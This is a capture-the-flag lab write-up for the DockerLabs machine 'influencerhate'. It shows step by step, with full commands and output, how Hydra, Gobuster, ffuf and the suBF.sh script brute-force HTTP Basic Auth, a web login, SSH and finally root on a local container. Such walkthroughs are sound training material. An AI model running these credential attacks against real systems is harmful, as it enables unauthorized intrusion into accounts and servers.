# influencerhate

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| influencerhate | El Pingüino de Mario | easy / facil | dockerlabs |

**Summary:** The influencerhate machine presented a layered exploitation path beginning with a HTTP Basic Authentication barrier protecting an Apache web server on port 80. The credentials were recovered by bruteforcing a default-credentials wordlist with Hydra, granting access to the web application. Directory enumeration with Gobuster then revealed a login form at `login.php`, whose credentials were subsequently cracked using a clusterbomb-style attack with ffuf against the rockyou wordlist, yielding the application-level account `admin:chocolate`. Inside the web application, a username was discovered — `balutin` — and SSH credentials for that user were then bruteforced with Hydra against the rockyou wordlist, producing the password `estrella`. Once on the machine as `balutin`, the attacker transferred the `suBF.sh` su-bruteforce script alongside the rockyou wordlist via SCP and executed a bruteforce against the root account, which exposed the password `rockyou`. This allowed a clean privilege escalation via `su - root`, achieving full control of the machine.

---

## Reconnaissance

The engagement began with machine deployment and an initial network scan to identify exposed services.

**1. Machine Deployment**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/influencerhate]
└─$ sudo bash auto_deploy.sh influencerhate.tar 

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /"""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

**2. Port Scan**

A full port scan was performed using Nmap with service and script detection against the target IP.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/influencerhate]
└─$ nmap -sC -sV -p- -T4 $ip
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-26 12:41 WIB
Nmap scan report for 172.17.0.2
Host is up (0.000023s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 86:ba:77:96:38:4e:54:22:d9:09:f1:03:17:bd:52:43 (ECDSA)
|_  256 28:b4:8b:66:08:67:77:f9:b0:f6:c2:94:58:34:dd:47 (ED25519)
80/tcp open  http    Apache httpd 2.4.62
|_http-server-header: Apache/2.4.62 (Debian)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Zona restringida
|_http-title: 401 Unauthorized
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: Host: 172.17.0.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.82 seconds
```

The scan revealed two open ports: SSH on port 22 and an HTTP service on port 80. Notably, the web server returned a `401 Unauthorized` response with a Basic Authentication realm named "Zona restringida", indicating credential protection at the HTTP level.

---

## Initial Access

### Bypassing HTTP Basic Authentication

**3. Hydra Credential Bruteforce against HTTP Basic Auth**

The HTTP Basic Authentication was attacked using Hydra with a default credentials wordlist, targeting a combined username:password format.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/influencerhate]
└─$ hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 172.17.0.2 http-get / -s 80 -t 4
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-26 20:53:06
[DATA] max 4 tasks per 1 server, overall 4 tasks, 66 login tries, ~17 tries per task
[DATA] attacking http-get://172.17.0.2:80/
[80][http-get] host: 172.17.0.2   login: httpadmin   password: fhttpadmin
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-26 20:53:08
```

Hydra successfully recovered the HTTP Basic Auth credentials: `httpadmin:fhttpadmin`.

### Directory Enumeration

**4. Gobuster Web Content Discovery**

With the HTTP Basic Auth credentials in hand, Gobuster was used to enumerate directories and files on the web server.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/influencerhate]
└─$ gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,txt,html -U "httpadmin" -P "fhttpadmin" 
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Auth User:               httpadmin
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.html           (Status: 200) [Size: 10701]
login.php            (Status: 200) [Size: 2798]
server-status        (Status: 403) [Size: 275]
```

A `login.php` page was discovered, indicating a secondary authentication layer at the application level.

### Bruteforcing the Web Application Login

**5. Encoding the HTTP Basic Auth Header**

The HTTP Basic Auth credentials were base64-encoded to be used as an `Authorization` header in subsequent requests.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/influencerhate]
└─$ echo -n 'httpadmin:fhttpadmin' | base64
aHR0cGFkbWluOmZodHRwYWRtaW4=
```

**6. ffuf Clusterbomb Attack against login.php**

A clusterbomb-style attack was launched using ffuf, fuzzing both the `username` and `password` parameters simultaneously while filtering out responses containing the failed-login message "Credenciales incorrectas".

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/influencerhate]
└─$ ffuf -u http://172.17.0.2/login.php -X POST -H "Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=" -H "Content-Type: application/x-www-form-urlencoded" -d "username=USERFUZZ&password=PASSFUZZ" -w /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt:USERFUZZ -w /usr/share/wordlists/rockyou.txt:PASSFUZZ -fr "Credenciales incorrectas"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://172.17.0.2/login.php
 :: Wordlist         : USERFUZZ: /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt
 :: Wordlist         : PASSFUZZ: /usr/share/wordlists/rockyou.txt
 :: Header           : Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=USERFUZZ&password=PASSFUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Credenciales incorrectas
________________________________________________

[Status: 200, Size: 2943, Words: 812, Lines: 85, Duration: 2ms]
    * PASSFUZZ: chocolate
    * USERFUZZ: admin
```

The credentials `admin:chocolate` were recovered, granting access to the web application.

**7. Web Application Login**

After logging in with the discovered credentials, the web panel revealed a username: `balutin`.

![](image.png)

### SSH Access as balutin

**8. Hydra SSH Bruteforce**

With the username `balutin` identified from the web application, a password bruteforce attack was launched against the SSH service.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/influencerhate]
└─$ hydra -l balutin -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 8
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-27 16:53:56
[DATA] max 8 tasks per 1 server, overall 8 tasks, 14344399 login tries (l:1/p:14344399), ~1793050 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: balutin   password: estrella
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-27 16:54:39
```

The SSH credentials `balutin:estrella` were recovered. An SSH session was then established.

**9. SSH Login and Initial Enumeration**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/influencerhate]
└─$ ssh balutin@$ip                                            
balutin@172.17.0.2's password: 
Linux 1b3ed0498627 6.18.33.2-microsoft-standard-WSL2 #1 SMP PREEMPT_DYNAMIC Thu Jun 18 21:54:43 UTC 2026 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
balutin@1b3ed0498627:~$ id;whoami;hostname
uid=1000(balutin) gid=1000(balutin) groups=1000(balutin),100(users)
balutin
1b3ed0498627
balutin@1b3ed0498627:~$ ls -la
total 20
drwx------ 2 balutin balutin 4096 Jun 28  2025 .
drwxr-xr-x 1 root    root    4096 Jun 28  2025 ..
-rw-r--r-- 1 balutin balutin  220 Jun 28  2025 .bash_logout
-rw-r--r-- 1 balutin balutin 3526 Jun 28  2025 .bashrc
-rw-r--r-- 1 balutin balutin  807 Jun 28  2025 .profile
```

A foothold was established as `balutin`. The home directory contained only standard shell configuration files, so the investigation moved toward privilege escalation.

---

## Privilege Escalation

### Bruteforcing su for Root Access

**10. Transferring Tools via SCP**

The rockyou wordlist and the `suBF.sh` bruteforce script (from `https://github.com/carlospolop/su-bruteforce`) were transferred to the target machine via SCP.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/influencerhate]
└─$ scp /usr/share/wordlists/rockyou.txt balutin@172.17.0.2:/tmp/
balutin@172.17.0.2's password: 
rockyou.txt                                                                100%  133MB 120.8MB/s   00:01 

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/influencerhate]
└─$ scp /opt/suBF.sh balutin@172.17.0.2:/tmp/ 
balutin@172.17.0.2's password: 
suBF.sh                                                                    100% 4083     3.6MB/s   00:00
```

**11. su Bruteforce and Root Access**

The `suBF.sh` script was executed to bruteforce the `root` account using the rockyou wordlist via the `su` command.

```bash
balutin@1b3ed0498627:/tmp$ ./suBF.sh -u root -w rockyou.txt 
  [+] Bruteforcing root...
  You can login as root using password: rockyou

^C
balutin@1b3ed0498627:/tmp$ su - root
Password: 
root@1b3ed0498627:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
1b3ed0498627
```

The root password `rockyou` was recovered and full root access was achieved.

---

## Attack Chain Summary
1. **Reconnaissance**: Nmap revealed ports 22 (SSH) and 80 (HTTP with Basic Auth protection).
2. **Vulnerability Discovery**: Hydra cracked the HTTP Basic Auth credentials (`httpadmin:fhttpadmin`) using a default credentials list. Gobuster enumerated a `login.php` endpoint behind the authentication wall.
3. **Exploitation**: ffuf performed a clusterbomb credential attack against `login.php`, recovering `admin:chocolate`. The web panel exposed the internal username `balutin`.
4. **Internal Enumeration**: Hydra bruteforced SSH credentials for `balutin` using rockyou, yielding the password `estrella`. Initial enumeration on the machine showed a minimal home directory.
5. **Privilege Escalation**: The `suBF.sh` script was transferred via SCP and used to bruteforce the `root` account via `su`, recovering the password `rockyou` and granting full root access.
